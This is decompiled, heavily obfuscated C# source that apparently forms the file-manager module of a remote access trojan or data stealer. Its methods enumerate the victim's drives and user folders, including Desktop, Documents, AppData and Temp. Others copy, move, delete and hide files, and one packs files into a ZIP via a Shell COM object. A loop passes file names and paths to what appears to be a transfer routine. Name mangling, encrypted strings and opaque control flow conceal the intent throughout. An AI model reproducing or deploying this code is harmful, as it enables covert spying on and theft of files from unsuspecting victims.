using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;

[StandardModule]
internal sealed class ____________________
{
	public unsafe static void _()
	{
		int num2 = default(int);
		int num3 = default(int);
		string[] array = default(string[]);
		while (true)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(______________________._____);
			FileInfo[] files = directoryInfo.GetFiles(_003CModule_003E.___<string>(4008727444u));
			int num = -8110;
			if ((uint)num2 / 33554432u != 4294958369u)
			{
				num3 = 0;
				goto IL_0006;
			}
			goto IL_0257;
			IL_011f:
			do
			{
				array[1] = ______________________________________________________________.________________________;
				array[2] = _003CModule_003E.______<string>(861631917u);
			}
			while ((((uint)num2 % 33u) | 0xFFFFF8BFu) != 4294965439u || num != -2832);
			goto IL_01f8;
			IL_0257:
			Thread.Sleep(3000);
			num3++;
			goto IL_0006;
			IL_0006:
			if (num3 >= files.Length)
			{
				break;
			}
			FileInfo fileInfo = files[num3];
			num = 18961;
			nint num5;
			if ((nint)Type.EmptyTypes.LongLength + -8110 == -8110)
			{
				if (!fileInfo.get_Name().Contains(_003CModule_003E.____<string>(511728657u)))
				{
					array = new string[9]
					{
						_003CModule_003E.___<string>(1348140809u),
						null,
						null,
						null,
						null,
						null,
						null,
						null,
						null
					};
					int num4 = _003CModule_003E.______________;
					num = (int)(((((uint)num4 / 67108864u - 8380) & 0x1BD82D00) == 467143936) ? ((nint)Type.EmptyTypes.LongLength + -2832) : ((nint)Type.EmptyTypes.LongLength + 1430308613));
					num5 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_00fd;
				}
				______________________________________________________________._________________(fileInfo.FullName.ToString(), _003CModule_003E.___<string>(1408750413u), 1024, 0);
				int num6 = _003CModule_003E.___________;
				if ((((uint)num6 % 1072250382u) | 0xBFFFFFFFu) != 3221225471u || num != -14222)
				{
					goto IL_0257;
				}
			}
			goto IL_01f8;
			IL_00fd:
			while (true)
			{
				nint num8;
				switch (num5)
				{
				case 0:
				{
					array[5] = fileInfo.FullName.ToString();
					array[6] = _003CModule_003E.______<string>(861631917u);
					int num7 = _003CModule_003E.______________;
					if (((uint)(-(0x17FF | num7)) ^ 0xFFFFE764u) != 0)
					{
						num8 = (nint)Type.EmptyTypes.LongLength + 8860;
					}
					else
					{
						int num9 = _003CModule_003E._____________;
						num8 = ((((4096 * num9) | -12) != -12) ? (((uint)num2 / 134217728u - 565182464 == (uint)(131072 * num2 * 1697536)) ? ((nint)Type.EmptyTypes.LongLength + -1248140325) : ((nint)Type.EmptyTypes.LongLength + 765078657)) : (sizeof(double) + -1751482585));
					}
					goto IL_01e9;
				}
				case 1:
					goto end_IL_00fd;
				}
				goto IL_011f;
				IL_01e9:
				num = (int)num8;
				num5 = (nint)Type.EmptyTypes.LongLength + 1;
				continue;
				end_IL_00fd:
				break;
			}
			array[7] = fileInfo.Length.ToString();
			if (num == 18376)
			{
				continue;
			}
			array[8] = _003CModule_003E.____<string>(974621068u);
			string string_ = string.Concat(array);
			______________________________________________________________.___________(string_);
			goto IL_0257;
			IL_01f8:
			array[3] = fileInfo.get_Name();
			array[4] = _003CModule_003E._____<string>(1143046530u);
			num5 = (nint)Type.EmptyTypes.LongLength + 0;
			goto IL_00fd;
		}
	}

	public static void __(string string_0, string string_1, bool bool_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				((ServerComputer)_____________._).get_FileSystem().CopyFile(string_0, string_1);
				if ((nint)Type.EmptyTypes.LongLength + 26228 != 26228)
				{
				}
				if (bool_0)
				{
					File.Delete(string_0);
				}
				______________________________________________________________.______________(_003CModule_003E.______<string>(1086631811u), _003CModule_003E.______<string>(2989372495u) + string_0);
			}
			if (Directory.Exists(string_0))
			{
				Directory.Move(string_0, string_1);
				if (bool_0)
				{
					((ServerComputer)_____________._).get_FileSystem().DeleteDirectory(string_0, (DeleteDirectoryOption)5);
				}
				______________________________________________________________.______________(_003CModule_003E.______<string>(1086631811u), _003CModule_003E._____<string>(807135730u) + string_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.___<string>(2759593373u), _003CModule_003E.______<string>(682011996u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ___(string string_0)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				File.WriteAllText(string_0, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 2225), (int)((nint)Type.EmptyTypes.LongLength + 3257), (int)((nint)Type.EmptyTypes.LongLength + 203)));
				______________________________________________________________.______________(_003CModule_003E.___<string>(2759593373u), _003CModule_003E.___<string>(4030316410u) + string_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.______<string>(1086631811u), _003CModule_003E.____<string>(2682037991u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			if (!Directory.Exists(string_0))
			{
				Directory.CreateDirectory(string_0);
				______________________________________________________________.______________(_003CModule_003E.___<string>(2759593373u), _003CModule_003E.______<string>(640561245u) + string_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._____<string>(3112419482u), _003CModule_003E._____<string>(1632167111u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void _____(string string_0, string string_1)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(string_0);
			FileAttributes fileAttributes = default(FileAttributes);
			int num;
			if (Operators.CompareString(string_1, _003CModule_003E.____<string>(1467947727u), false) == 0)
			{
				num = sizeof(int) + -4;
				goto IL_006d;
			}
			goto IL_009b;
			IL_0068:
			fileAttributes = FileAttributes.Hidden;
			goto IL_002f;
			IL_009b:
			if (Operators.CompareString(string_1, _003CModule_003E.____<string>(4230085069u), false) != 0)
			{
				goto IL_002f;
			}
			num = sizeof(uint) + -3;
			goto IL_006d;
			IL_0082:
			fileInfo.Attributes = FileAttributes.Normal;
			goto IL_009b;
			IL_002f:
			if (Operators.CompareString(string_1, _003CModule_003E.___<string>(1268020886u), false) != 0)
			{
				goto IL_0045;
			}
			goto IL_0063;
			IL_0045:
			if (Operators.CompareString(string_1, _003CModule_003E.___<string>(1973747168u), false) == 0)
			{
				num = sizeof(byte) + 2;
				goto IL_006d;
			}
			goto IL_00b4;
			IL_00b4:
			if (Operators.CompareString(string_1, _003CModule_003E.____<string>(3926562503u), false) == 0)
			{
				fileAttributes = FileAttributes.NotContentIndexed;
			}
			if (Operators.CompareString(string_1, _003CModule_003E._____<string>(3601540063u), false) != 0)
			{
				fileInfo.Attributes += (int)fileAttributes;
			}
			______________________________________________________________.______________(_003CModule_003E._____<string>(3112419482u), _003CModule_003E.___<string>(562294604u) + string_0);
			return;
			IL_006d:
			switch (num)
			{
			case 2:
				break;
			case 1:
				goto IL_0068;
			default:
				goto IL_0082;
			case 3:
				goto IL_00b1;
			}
			goto IL_0063;
			IL_00b1:
			fileAttributes = FileAttributes.ReadOnly;
			goto IL_00b4;
			IL_0063:
			fileAttributes = FileAttributes.System;
			goto IL_0045;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string string_2 = _003CModule_003E._______<string>(2779757176u);
			string string_3 = _003CModule_003E.___<string>(2276795188u) + ex2.ToString();
			_003CModule_003E.____________ = -805702749;
			______________________________________________________________.______________(string_2, string_3);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______(string string_0, string string_1)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID(_003CModule_003E._______<string>(2489862438u))));
			byte[] array = new byte[22];
			int num = (int)((nint)Type.EmptyTypes.LongLength + -14614);
			nint num2 = (nint)Type.EmptyTypes.LongLength + 8;
			int num3 = default(int);
			while (true)
			{
				switch (num2)
				{
				default:
					while (true)
					{
						array[0] = 80;
						array[1] = 75;
						num3 = num;
						num = 831;
						if (num3 != -14614 || (0x20u & (uint)((2048 * num3) ^ (4 * ((num3 << 23) + 8180)))) != 0)
						{
							break;
						}
						array[2] = 5;
						array[3] = 6;
						if (num == 3556)
						{
							continue;
						}
						goto IL_00a0;
					}
					goto case 0;
				case 0:
					array[18] = 0;
					array[19] = 0;
					num2 = sizeof(Guid) + -13;
					break;
				case 7:
					array[16] = 0;
					array[17] = 0;
					num2 = sizeof(Guid) + -16;
					break;
				case 4:
					array[10] = 0;
					array[11] = 0;
					if (-(num * 771 + 253 * num) == -1446 || num != 27711)
					{
						array[12] = 0;
						array[13] = 0;
						num2 = (nint)Type.EmptyTypes.LongLength + 5;
						break;
					}
					goto case 6;
				case 6:
					array[8] = 0;
					array[9] = 0;
					num = sizeof(long) + -5401;
					goto case 4;
				case 5:
					array[14] = 0;
					array[15] = 0;
					goto case 7;
				case 3:
					array[20] = 0;
					array[21] = 0;
					num = sizeof(ushort) + 15235;
					num2 = (nint)Type.EmptyTypes.LongLength + 1;
					break;
				case 2:
				{
					array[6] = 0;
					array[7] = 0;
					int num4 = _003CModule_003E.____________;
					num2 = (((((uint)num4 >> 12) % 917991u >> 1) - 268435456 == (uint)num4 / 14885199u) ? ((num3 - 6948 - 4482 != (int)((uint)(num3 << 7) >> 7)) ? ((nint)Type.EmptyTypes.LongLength + -1439604096) : (sizeof(double) + 1725204709)) : ((nint)Type.EmptyTypes.LongLength + 6));
					break;
				}
				case 1:
					{
						byte[] array2 = array;
						FileSystem.WriteAllBytes(string_1, array2, false);
						object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, _003CModule_003E._______<string>(698400352u), new object[1] { string_0 }, (string[])null, (Type[])null, (bool[])null));
						if (num != 15237 || ((-536870912 * num3) ^ 0x65EC) == 0)
						{
							goto case 7;
						}
						object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, _003CModule_003E.____<string>(1946057262u), new object[1] { string_1 }, (string[])null, (Type[])null, (bool[])null));
						NewLateBinding.LateCall(objectValue3, (Type)null, _003CModule_003E.____<string>(1339012130u), new object[2]
						{
							RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, _003CModule_003E.___<string>(1449849698u), new object[0], (string[])null, (Type[])null, (bool[])null)),
							4
						}, (string[])null, (Type[])null, (bool[])null, true);
						______________________________________________________________.______________(_003CModule_003E._______<string>(2779757176u), _003CModule_003E._______<string>(2708952630u) + string_1);
						return;
					}
					IL_00a0:
					array[4] = 0;
					array[5] = 0;
					num2 = sizeof(byte) + 1;
					break;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.___<string>(2759593373u), _003CModule_003E._____<string>(4219849851u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void _______(string string_0, string string_1)
	{
		try
		{
			_____________________ ____________________2 = new _____________________();
			____________________2.__ = string_0;
			____________________2._ = string_1;
			Thread thread = new Thread(____________________2._);
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ________()
	{
		try
		{
			string[] array = default(string[]);
			_003CModule_003E._______ = array;
			string text = _003CModule_003E.___<string>(1631678510u);
			foreach (DriveInfo drife in ((ServerComputer)_____________._).get_FileSystem().get_Drives())
			{
				try
				{
					array = new string[8] { text, null, null, null, null, null, null, null };
					int num = -14210;
					if (sizeof(ushort) + -1877 != 31947)
					{
					}
					do
					{
						array[1] = _003CModule_003E._____<string>(3169641276u);
						array[2] = drife.Name;
					}
					while (num != -14210 || ((uint)(num * -939524096) & 0x7FFDECBu) != 0);
					array[3] = _003CModule_003E._______<string>(1136580736u);
					array[4] = ____________(drife.AvailableFreeSpace);
					array[5] = _003CModule_003E._______<string>(492003881u);
					array[6] = ____________(drife.TotalSize);
					array[7] = _003CModule_003E._______<string>(1974200954u);
					text = string.Concat(array);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			______________________________________________________________.____________(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string string_ = _003CModule_003E.___<string>(2759593373u);
			_003CModule_003E.____________ = 1987339265;
			______________________________________________________________.______________(string_, _003CModule_003E.____<string>(3349951619u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void _________(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			string text = _003CModule_003E._____<string>(3976217056u) + string_0 + _003CModule_003E._______<string>(1974200954u);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			int num = default(int);
			string[] array = default(string[]);
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo directoryInfo2 = directories[i];
				try
				{
					if ((0xE & (13 * i + i * 19 - 2910)) == 2)
					{
						array = new string[6] { text, null, null, null, null, null };
						num = 14150;
						array[1] = _003CModule_003E.______<string>(2908435604u);
						array[2] = directoryInfo2.get_Name();
					}
					array[3] = _003CModule_003E.______<string>(1254399426u);
					array[4] = directoryInfo2.CreationTime.ToString();
					array[5] = _003CModule_003E._______<string>(1974200954u);
					text = string.Concat(array);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			FileInfo[] files = directoryInfo.GetFiles(_003CModule_003E.____<string>(3168166045u));
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					if (num - 1751415339 - 247 == 8741 + num)
					{
					}
					array = new string[7] { text, null, null, null, null, null, null };
					nint num2 = (nint)Type.EmptyTypes.LongLength + 1;
					while (true)
					{
						switch (num2)
						{
						case 0:
							array[3] = ____________(fileInfo.Length).ToString();
							array[4] = _003CModule_003E._______<string>(4149070876u);
							array[5] = fileInfo.CreationTime.ToString();
							array[6] = _003CModule_003E.____<string>(3008796200u);
							text = string.Concat(array);
							goto end_IL_014f;
						}
						array[1] = fileInfo.get_Name();
						array[2] = _003CModule_003E.___<string>(956658278u);
						num2 = (nint)Type.EmptyTypes.LongLength + 0;
						continue;
						end_IL_014f:
						break;
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			______________________________________________________________.____________(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.______<string>(1086631811u), _003CModule_003E.______<string>(3909147461u) + string_0 + _003CModule_003E._____<string>(2106542073u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void __________(string string_0)
	{
		try
		{
			nint num3;
			int num2 = default(int);
			int num = default(int);
			if (Operators.CompareString(string_0, _003CModule_003E.______<string>(3547943008u), false) == 0)
			{
				if ((((uint)(-8239104 * num) / 251u) ^ 0x20000F4Du) != 0)
				{
					goto IL_015f;
				}
				num3 = ((1048576 * num2 + 293056 == num2 * 7560192 << 2) ? ((nint)Type.EmptyTypes.LongLength + 388143003) : (sizeof(short) + -1480917317));
			}
			else if (Operators.CompareString(string_0, _003CModule_003E.______<string>(920828807u), false) == 0)
			{
				num3 = (nint)Type.EmptyTypes.LongLength + 3;
			}
			else if (Operators.CompareString(string_0, _003CModule_003E._____<string>(1056333498u), false) == 0)
			{
				num3 = ((-268435456 + (int)(((uint)num >> 22) % 749u) == (0x1112 & num) * 8388608) ? ((nint)Type.EmptyTypes.LongLength + -1697326021) : ((((num * 4190208 + 3919) | -3728) != -129) ? ((nint)Type.EmptyTypes.LongLength + -2081031492) : (((((uint)num2 % 7565623u) ^ 0x100097Cu) != 0) ? ((nint)Type.EmptyTypes.LongLength + 1) : ((nint)Type.EmptyTypes.LongLength + -1755272948))));
			}
			else
			{
				if (Operators.CompareString(string_0, _003CModule_003E.___<string>(4022001822u), false) != 0)
				{
					if (Operators.CompareString(string_0, _003CModule_003E._______<string>(3720245936u), false) == 0)
					{
						num = 30865;
						if ((((-3 | -(num2 & 0xCC8)) != -3) ? ((nint)Type.EmptyTypes.LongLength + 2128221406) : 27340) == 27340)
						{
							_________(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
							return;
						}
						goto IL_01c2;
					}
					if (Operators.CompareString(string_0, _003CModule_003E.___<string>(2549939654u), false) == 0)
					{
						_________(Path.GetTempPath());
					}
					else if (Operators.CompareString(string_0, _003CModule_003E._______<string>(2441107057u), false) == 0)
					{
						_________(Environment.GetEnvironmentVariable(_003CModule_003E.______<string>(239870652u)));
					}
					return;
				}
				num3 = (nint)Type.EmptyTypes.LongLength + 0;
			}
			switch (num3)
			{
			case 1:
				_________(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
				return;
			case 3:
				_________(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
				return;
			case 0:
				goto IL_01c2;
			}
			goto IL_015f;
			IL_015f:
			_________(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
			return;
			IL_01c2:
			_________(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				((ServerComputer)_____________._).get_FileSystem().DeleteFile(string_0);
				switch ((nint)Type.EmptyTypes.LongLength + 0)
				{
				}
				______________________________________________________________.______________(_003CModule_003E._____<string>(3112419482u), _003CModule_003E.___<string>(1844213372u) + string_0);
			}
			if (Directory.Exists(string_0))
			{
				((ServerComputer)_____________._).get_FileSystem().DeleteDirectory(string_0, (DeleteDirectoryOption)5);
				______________________________________________________________.______________(_003CModule_003E.______<string>(1086631811u), _003CModule_003E.___<string>(3578224275u) + string_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._______<string>(2779757176u), _003CModule_003E.______<string>(226053735u) + string_0 + _003CModule_003E.____<string>(748004036u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static string ____________(long long_0)
	{
		try
		{
			string[] array = new string[9]
			{
				_003CModule_003E.______<string>(2839351019u),
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			};
			int num = -19602;
			if (sizeof(int) + -3049 == -3045)
			{
				array[1] = _003CModule_003E.____<string>(603851315u);
				array[2] = _003CModule_003E._____<string>(1562054689u);
				int num2 = global::___________._;
				num = (int)((nint)Type.EmptyTypes.LongLength + -16868);
				switch (((0x119C3 ^ ((uint)num2 % 6306u)) == 0) ? (sizeof(long) + 1298427267) : ((nint)Type.EmptyTypes.LongLength + 0))
				{
				}
			}
			array[3] = _003CModule_003E._______<string>(813962615u);
			array[4] = _003CModule_003E._______<string>(2934059989u);
			int num3 = num;
			num = -25262;
			if (num3 != 18093 || (((uint)num3 / 4096u) & 0xFFF00000u) != 0)
			{
				int ________________;
				do
				{
					array[5] = _003CModule_003E.____<string>(3062466091u);
					array[6] = _003CModule_003E.____<string>(1529636137u);
					________________ = _003CModule_003E._________________;
				}
				while ((int)((uint)________________ % 1195u) - ________________ * -1275068416 != -1135615528 && num == 9622);
			}
			array[7] = _003CModule_003E.______<string>(3812429042u);
			array[8] = _003CModule_003E._____<string>(2368630469u);
			string[] array2 = array;
			double num4 = Math.Floor(Math.Log(long_0, 1024.0));
			return (Math.Round((double)long_0 / Math.Pow(1024.0, num4), 2) + _003CModule_003E.____<string>(1226113571u) + array2[(int)Math.Round(num4)]).ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = _003CModule_003E._____<string>(1521433505u);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
